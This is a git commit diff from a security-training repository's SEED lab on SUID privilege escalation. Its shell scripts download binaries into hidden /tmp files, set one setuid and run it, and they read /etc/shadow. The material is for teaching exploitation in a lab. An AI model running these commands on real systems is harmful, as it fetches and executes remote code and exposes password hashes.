eda2f4a5bd3b2f1972df9f8aa8d4749998012e80
cappetta <thomas.cappetta@gmail.com>
2019-09-29 10:53:20 -0400

    seed: lab1 under test

--- tutorials/seed/suid/getme.sh
+++ tutorials/seed/suid/getme.sh
@@ -1,1 +1,6 @@
-wget -O /tmp/.malicious https://raw.githubusercontent.com/cappetta/CyberRange/master/tutorials/seed/suid/poc; chmod 4755 /tmp/.malicious; export BAD_PATH=/tmp; /tmp/.malicious
+wget -O /tmp/.poc https://raw.githubusercontent.com/cappetta/CyberRange/master/tutorials/seed/suid/poc; 
+wget -O /tmp/.malicious https://raw.githubusercontent.com/cappetta/CyberRange/master/tutorials/seed/suid/malicious; 
+
+chmod 4755 /tmp/.poc;
+chmod 755 /tmp/.malicious; 
+export BAD_PATH=/tmp; /tmp/.poc
--- tutorials/seed/suid/malicious.sh
+++ tutorials/seed/suid/malicious.sh
@@ -1,3 +1,2 @@
 /bin/sh -c whoami
-touch /tmp/z_mal
 cat /etc/shadow
